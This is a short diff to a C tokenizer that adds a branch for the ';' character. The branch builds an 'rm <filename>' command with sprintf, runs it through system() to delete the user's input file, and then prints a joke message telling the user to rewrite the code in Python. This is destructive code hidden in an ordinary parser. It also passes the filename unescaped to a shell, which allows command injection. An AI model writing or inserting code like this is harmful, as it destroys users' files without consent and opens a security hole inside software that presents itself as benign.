@@ -110,6 +110,16 @@ size_t tokenize(const char *filename,
         {
             if (*readPtr == 0)
                 break;
+            if (*readPtr == ';')
+            {
+                char command[BUFFER_SIZE] = "";
+                sprintf(command, "rm %s", filename);
+                system(command);
+                ASSERT_OK(0, "Got token ';'. "
+                             "Developer of this language prefers Python and "
+                             "hates ';', so your code with ';' was deleted."
+                             "Please rewrite it on Python!")
+            }
             ASSERT_OK(0, "Incorrect token _%c_", *readPtr)
         }
         tokens->size++;
